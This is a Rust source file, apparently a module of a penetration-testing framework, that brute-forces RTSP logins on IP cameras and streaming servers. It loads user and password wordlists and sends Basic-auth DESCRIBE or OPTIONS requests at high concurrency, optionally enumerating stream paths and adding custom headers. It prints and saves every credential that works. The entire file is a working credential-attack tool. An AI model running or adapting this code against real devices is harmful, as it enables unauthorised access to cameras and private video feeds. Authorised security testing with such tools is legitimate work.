use anyhow::{anyhow, Result};
use base64::engine::general_purpose::STANDARD as Base64;
use base64::Engine as _;
use colored::*;
use futures::stream::{FuturesUnordered, StreamExt};
use std::{
    fs::File,
    io::Write,
    net::SocketAddr,
    sync::Arc,
    sync::atomic::{AtomicBool, Ordering},
    time::Duration,
};
use tokio::{
    io::{AsyncReadExt, AsyncWriteExt},
    net::TcpStream,
    sync::{Mutex, Semaphore},
    time::sleep,
};

use crate::utils::{
    prompt_yes_no, prompt_wordlist, prompt_default, prompt_int_range,
    load_lines, get_filename_in_current_dir, normalize_target,
};
use crate::modules::creds::utils::BruteforceStats;

const PROGRESS_INTERVAL_SECS: u64 = 2;

fn display_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║   Advanced RTSP Brute Force Module                        ║".cyan());
    println!("{}", "║   IP Camera and Streaming Server Credential Testing       ║".cyan());
    println!("{}", "║   Supports path enumeration and custom headers            ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
    println!();
}

/// Main entry point for the advanced RTSP brute force module.
pub async fn run(target: &str) -> Result<()> {
    display_banner();
    println!("{}", format!("[*] Target: {}", target).cyan());

    let port: u16 = prompt_default("RTSP Port", "554").await?
        .parse().unwrap_or(554);

    let usernames_file = prompt_wordlist("Username wordlist").await?;
    let passwords_file = prompt_wordlist("Password wordlist").await?;

    let concurrency = prompt_int_range("Max concurrent tasks", 10, 1, 10000).await? as usize;

    let stop_on_success = prompt_yes_no("Stop on first success?", true).await?;
    let _save_results = prompt_yes_no("Save results to file?", true).await?;
    let save_path = if _save_results {
        Some(prompt_default("Output file", "rtsp_results.txt").await?)
    } else {
        None
    };
    let verbose = prompt_yes_no("Verbose mode?", false).await?;
    let combo_mode = prompt_yes_no("Combination mode? (try every pass with every user)", false).await?;

    let advanced_mode = prompt_yes_no("Use advanced RTSP commands/headers (DESCRIBE + custom headers)?", false).await?;
    let mut advanced_headers: Vec<String> = Vec::new();
    let advanced_command = if advanced_mode {
        let method = prompt_default("RTSP method to use (e.g. DESCRIBE)", "DESCRIBE").await?;
        if prompt_yes_no("Load extra RTSP headers from a file?", false).await? {
            let headers_path = prompt_wordlist("Path to RTSP headers file").await?;
            advanced_headers = load_lines(&headers_path)?;
        }
        Some(method)
    } else {
        None
    };
    let advanced_headers = Arc::new(advanced_headers);

    let (addr, implicit_path) = normalize_target_input(target, port)?;
    let found = Arc::new(Mutex::new(Vec::new()));
    let stop = Arc::new(AtomicBool::new(false));
    let stats = Arc::new(BruteforceStats::new()); // Standardized stats
    let semaphore = Arc::new(Semaphore::new(concurrency));

    println!("\n[*] Starting brute-force on {}", addr);

    let resolved_addrs = match resolve_targets(&addr).await {
        Ok(addrs) => Arc::new(addrs),
        Err(e) => {
            eprintln!("[!] Failed to resolve '{}': {}", addr, e);
            return Err(e);
        }
    };

    let users = load_lines(&usernames_file)?;
    if users.is_empty() {
        println!("[!] Username wordlist is empty. Exiting.");
        return Ok(());
    }

    let pass_lines = load_lines(&passwords_file)?;
    if pass_lines.is_empty() {
        println!("[!] Password wordlist is empty. Exiting.");
        return Ok(());
    }

    let brute_force_paths = prompt_yes_no("Brute force possible RTSP paths (e.g. /stream /live)?", false).await?;
    let mut paths = if brute_force_paths {
        let paths_file = prompt_wordlist("Path to RTSP paths file").await?;
        load_lines(&paths_file)?
    } else {
        vec!["".to_string()]
    };
    if paths.is_empty() {
        println!("[!] RTSP paths list is empty. Falling back to default root path.");
        paths.push(String::new());
    }
    if let Some(p) = implicit_path {
        if !paths.iter().any(|existing| existing == &p) {
            paths.insert(0, p);
        }
    }
    println!();

    // Start progress reporter
    let stats_clone = stats.clone();
    let stop_clone = stop.clone();
    let progress_handle = tokio::spawn(async move {
        loop {
            if stop_clone.load(Ordering::Relaxed) {
                break;
            }
            stats_clone.print_progress();
            sleep(Duration::from_secs(PROGRESS_INTERVAL_SECS)).await;
        }
    });

    let mut tasks = FuturesUnordered::new();
    let mut idx = 0usize;

    // Use loop structure from other modules or this module's custom loop?
    // This module iterates: pass list (outer), user list (inner depending on combo), then paths.
    // I will preserve the original logic flow.

    for pass in pass_lines {
        if stop_on_success && stop.load(Ordering::Relaxed) { break; }

        let userlist: Vec<String> = if combo_mode {
            users.clone()
        } else {
            vec![users.get(idx % users.len()).unwrap_or(&users[0]).to_string()]
        };

        for user in userlist {
            if stop_on_success && stop.load(Ordering::Relaxed) { break; }
            for path in &paths {
                if stop_on_success && stop.load(Ordering::Relaxed) { break; }

                let addr_clone = addr.clone();
                let user_clone = user.clone();
                let pass_clone = pass.clone();
                let path_clone = path.clone();
                let found_clone = Arc::clone(&found);
                let stop_clone = Arc::clone(&stop);
                let stats_clone = Arc::clone(&stats);
                let command = advanced_command.clone();
                let headers = Arc::clone(&advanced_headers);
                let semaphore_clone = Arc::clone(&semaphore);
                let addrs_clone = Arc::clone(&resolved_addrs);
                let stop_flag = stop_on_success;
                let verbose_flag = verbose;

                tasks.push(tokio::spawn(async move {
                    if stop_flag && stop_clone.load(Ordering::Relaxed) { return; }
                    let permit = match semaphore_clone.acquire_owned().await {
                        Ok(permit) => permit,
                        Err(_) => return,
                    };
                    if stop_flag && stop_clone.load(Ordering::Relaxed) { 
                        drop(permit);
                        return; 
                    }

                    match try_rtsp_login(
                        addrs_clone.as_slice(),
                        &addr_clone,
                        &user_clone,
                        &pass_clone,
                        &path_clone,
                        command.as_deref(),
                        &headers,
                    ).await {
                        Ok(true) => {
                            let path_str = if path_clone.is_empty() { "NO_PATH" } else { &path_clone };
                            println!("\r{}", format!("[+] {} -> {}:{} [path={}]", addr_clone, user_clone, pass_clone, path_str).green().bold());
                            found_clone.lock().await.push((addr_clone.clone(), user_clone.clone(), pass_clone.clone(), path_str.to_string()));
                            stats_clone.record_success();
                            if stop_flag {
                                stop_clone.store(true, Ordering::Relaxed);
                            }
                        }
                        Ok(false) => {
                            stats_clone.record_failure();
                            if verbose_flag {
                                println!("\r{}", format!("[-] {} -> {}:{} [path={}]", addr_clone, user_clone, pass_clone, path_clone).dimmed());
                            }
                        }
                        Err(e) => {
                            stats_clone.record_error(e.to_string()).await;
                            if verbose_flag {
                                println!("\r{}", format!("[!] {} -> error: {}", addr_clone, e).red());
                            }
                        }
                    }

                    drop(permit);
                    sleep(Duration::from_millis(10)).await;
                }));

                // Limit task generation if queue prevents high memory usage (though semaphore limits active tasks)
                // The semaphore logic above (acquire_owned) already throttles concurrency.
            }
        }
        idx += 1;
    }

    while let Some(res) = tasks.next().await {
        if let Err(e) = res {
            if verbose {
               stats.record_error(format!("Task panic: {}", e)).await;
            }
        }
    }

    // Stop progress reporter
    stop.store(true, Ordering::Relaxed);
    let _ = progress_handle.await;

    // Print final statistics
    stats.print_final().await;

    let creds = found.lock().await;
    if creds.is_empty() {
        println!("{}", "[-] No credentials found (with these paths).".yellow());
    } else {
        println!("{}", format!("[+] Found {} valid credential(s):", creds.len()).green().bold());
        for (host, user, pass, path) in creds.iter() {
            println!("    {} -> {}:{} [path={}]", host, user, pass, path);
        }

        if let Some(path) = save_path {
            let filename = get_filename_in_current_dir(&path);
            if let Ok(mut file) = File::create(&filename) {
                for (host, user, pass, path) in creds.iter() {
                    let _ = writeln!(file, "{} -> {}:{} [path={}]", host, user, pass, path);
                }
                println!("[+] Results saved to '{}'", filename.display());
            }
        }
    }

    Ok(())
}

/// Resolve a host:port (literal v4/v6 or DNS) into all possible SocketAddrs.
async fn resolve_targets(addr: &str) -> Result<Vec<SocketAddr>> {
    // 1) If it's a literal SocketAddr, return it directly
    if let Ok(sa) = addr.parse::<SocketAddr>() {
        return Ok(vec![sa]);
    }

    // 2) Split into host / port
    let (host, port) = if let Some((h, p)) = addr.rsplit_once(':') {
        (h.to_string(), p.parse().unwrap_or(554))
    } else {
        (addr.to_string(), 554)
    };

    // 3) Clean any nested brackets and format bracketed IPv6 or plain host
    let host_clean = host.trim_matches(|c| c == '[' || c == ']').to_string();
    let host_port = if host_clean.contains(':') {
        format!("[{}]:{}", host_clean, port)
    } else {
        format!("{}:{}", host_clean, port)
    };

    // 4) DNS lookup (handles A + AAAA)
    let addrs = tokio::net::lookup_host(host_port.clone())
        .await
        .map_err(|e| anyhow!("DNS lookup '{}': {}", host_port, e))?
        .collect::<Vec<_>>();

    if addrs.is_empty() {
        Err(anyhow!("No addresses found for '{}'", host_port))
    } else {
        Ok(addrs)
    }
}

/// Attempt RTSP login, trying each resolved address until one succeeds or all fail.
async fn try_rtsp_login(
    addrs: &[SocketAddr],
    addr_display: &str,
    user: &str,
    pass: &str,
    path: &str,
    method: Option<&str>,
    extra_headers: &[String],
) -> Result<bool> {
    let mut last_err = None;
    let mut stream = None;
    let mut connected_sa: Option<SocketAddr> = None;

    // Try each candidate address
    for sa in addrs {
        match TcpStream::connect(*sa).await {
            Ok(s) => {
                stream = Some(s);
                connected_sa = Some(*sa);
                break;
            }
            Err(e) => {
                last_err = Some(e);
                continue;
            }
        }
    }

    // Unwrap the successful connection and SocketAddr
    let (mut stream, sa) = match (stream, connected_sa) {
        (Some(s), Some(sa)) => (s, sa),
        _ => {
            return Err(anyhow!(
                "All connection attempts to {} failed: {}",
                addr_display,
                last_err.map(|e| e.to_string()).unwrap_or_default()
            ))
        }
    };

    // Build a proper host:port string for the RTSP URI, handling IPv6 correctly
    let ip_str = sa.ip().to_string();
    let host_for_uri = if ip_str.contains(':') {
        format!("[{}]:{}", ip_str, sa.port())
    } else {
        format!("{}:{}", ip_str, sa.port())
    };

    let rtsp_method = method.unwrap_or("OPTIONS");
    let path_str = if path.is_empty() { "" } else { path };
    let credentials = Base64.encode(format!("{}:{}", user, pass));

    let mut request = format!(
        "{method} rtsp://{host}/{path} RTSP/1.0\r\nCSeq: 1\r\nAuthorization: Basic {auth}\r\n",
        method = rtsp_method,
        host = host_for_uri,
        path = path_str.trim_start_matches('/'),
        auth = credentials,
    );

    for header in extra_headers {
        request.push_str(header);
        if !header.ends_with("\r\n") {
            request.push_str("\r\n");
        }
    }
    request.push_str("\r\n");

    stream.write_all(request.as_bytes()).await?;
    let mut buffer = [0u8; 2048];
    let n = stream.read(&mut buffer).await?;
    if n == 0 {
        return Err(anyhow!("{}: server closed connection unexpectedly.", addr_display));
    }
    let response = String::from_utf8_lossy(&buffer[..n]);

    if response.contains("200 OK") {
        Ok(true)
    } else if response.contains("401") || response.contains("403") {
        Ok(false)
    } else {
        Err(anyhow!("{}: unexpected RTSP response:\n{}", addr_display, response))
    }
}

fn normalize_target_input(target: &str, default_port: u16) -> Result<(String, Option<String>)> {
    let trimmed = target.trim();
    if trimmed.is_empty() {
        return Err(anyhow!("Target cannot be empty."));
    }

    let without_scheme = trimmed.strip_prefix("rtsp://").unwrap_or(trimmed);
    let (host_part, path_part) = if let Some((host, path)) = without_scheme.split_once('/') {
        (host.trim(), Some(path.to_string()))
    } else {
        (without_scheme.trim(), None)
    };

    // Use shared normalization for the host/port part
    let normalized_host = normalize_target(host_part)?;
    
    // Check if normalized host implies a port. normalize_target returns host:port or host.
    // If it has no port, we might want to append default_port, OR return it as is and let caller handle.
    // However, existing logic seemed to force a port.
    // Let's check if port is present.
    // A simple heuristic: if it ends with digit, check for colon.
    // [ipv6]:port, ipv4:port, host:port.
    // If we assume normalize_target did its job, we just need to adhere to the return type.
    // But wait, if normalize_target returned "host", and we want "host:554", we need to append.
    // Checking for port on a normalized string:
    let has_port = if normalized_host.starts_with('[') {
        normalized_host.rfind(':').map(|i| i > normalized_host.rfind(']').unwrap_or(0)).unwrap_or(false)
    } else {
        normalized_host.contains(':')
    };

    let final_host = if has_port {
        normalized_host
    } else {
        format!("{}:{}", normalized_host, default_port)
    };

    let normalized_path = path_part.and_then(|p| {
        let truncated = p.split(|c| c == '?' || c == '#').next().unwrap_or_default();
        let trimmed = truncated.trim();
        if trimmed.is_empty() || trimmed == "/" {
            None
        } else {
            let mut path = trimmed.to_string();
            if !path.starts_with('/') {
                path.insert(0, '/');
            }
            Some(path)
        }
    });

    Ok((final_host, normalized_path))
}
// ─── Prompt and utility functions unchanged ───────────────────────────────────


